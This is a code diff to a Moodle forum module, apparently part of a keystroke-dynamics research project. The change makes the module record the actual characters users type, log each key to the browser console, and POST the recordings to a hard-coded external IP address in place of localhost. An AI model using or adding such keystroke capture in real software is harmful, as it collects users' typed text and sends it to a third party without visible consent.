@@ -63,17 +63,21 @@ YUI.add('moodle-mod_forum-capture_keystroke',
             models[id] = [];
             return id;
         }
-        function listenerCallback(event, action, id){
-            var keyCode = event.which || event.keyCode; // event.keyCode is used for IE8 and earlier
-            if (keyCode != 9){
-                addParamInModel(keyCode, action, id);
-                console.log(keyCode)
-            };
-            event.stopPropagation();
-        }
-        function addParamInModel(keyCode, action, id) {
-            models[id].push({ keyCode: keyCode, time: getTime(), action: action });
-        }
+		function listenerCallback(event, action, id){
+			var keyCode = event.which || event.keyCode; // event.keyCode is used for IE8 and earlier
+			var keyCodeChar = event.key.charCodeAt(0)
+			var key = event.key
+			if (keyCode != 9){
+				addParamInModel(keyCode, action, id, keyCodeChar, key);
+				console.log('keyCode: ' + keyCode)
+				console.log('keyCodeChar: ' + keyCodeChar)
+				console.log('key: ' + key)
+			};
+			event.stopPropagation();
+		}
+		function addParamInModel(keyCode, action, id, keyCodeChar, key) {
+			models[id].push({ keyCode: keyCode, time: getTime(), action: action, keyCodeChar: keyCodeChar, key: key });
+		}
         function getTime() {
             return new Date().getTime();
         }
@@ -129,7 +133,7 @@ YUI.add('moodle-mod_forum-capture_keystroke',
             formData.append('model', JSON.stringify(getValidatedModel()));
             formData.append('idUser', idUser);
         
-            request.open("POST", "http://localhost:5000/" + serviceName, true);
+            request.open("POST", "http://104.236.17.154:8080/pesquisaEOpiniao/moodle/" + serviceName, true);
             request.send(formData);
             clearModel();
         }
